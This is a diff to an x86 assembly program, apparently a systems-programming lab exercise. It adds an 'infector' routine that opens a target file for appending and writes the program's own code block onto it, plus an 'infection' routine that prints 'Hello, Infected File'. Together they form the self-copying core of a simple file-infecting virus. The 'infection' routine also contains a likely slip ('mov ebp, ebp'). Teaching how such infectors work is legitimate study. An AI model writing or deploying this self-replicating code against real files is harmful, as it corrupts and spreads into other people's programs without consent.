@@ -1,6 +1,25 @@
+stdout EQU 1
+
+SYS_WRITE EQU 4
+SYS_OPEN  EQU 5
+SYS_CLOSE EQU 6
+
+O_WRONLY EQU 1
+O_APPEND EQU 1024
+
+section .rodata
+    hello: db "Hello, Infected File", 10, 0
+    hello_len: EQU $ - hello - 1
+
 section .text
 global _start
 global system_call
+
+global code_start
+global code_end
+global infection
+global infector
+
 extern main
 _start:
     pop    dword ecx    ; ecx = argc
@@ -38,3 +57,54 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+code_start:
+
+infection:
+    push ebp
+    mov ebp, ebp
+    pushad
+
+    push dword hello_len
+    push dword hello
+    push dword stdout
+    push dword SYS_WRITE
+    call system_call
+    add esp, 16
+
+    popad
+    pop ebp
+    ret
+
+infector:
+    push ebp
+    mov ebp, esp
+    sub esp, 4
+    pushad
+
+    push dword 0
+    push dword O_WRONLY | O_APPEND
+    push dword [ebp+8]
+    push dword SYS_OPEN
+    call system_call
+    mov [ebp-4], eax
+    add esp, 16
+    
+    push dword code_end - code_start
+    push dword code_start
+    push dword [ebp-4]
+    push dword SYS_WRITE
+    call system_call
+    add esp, 16
+
+    push dword [ebp-4]
+    push dword SYS_CLOSE
+    call system_call
+    add esp, 8
+
+    popad
+    mov esp, ebp
+    pop ebp
+    ret
+
+code_end:
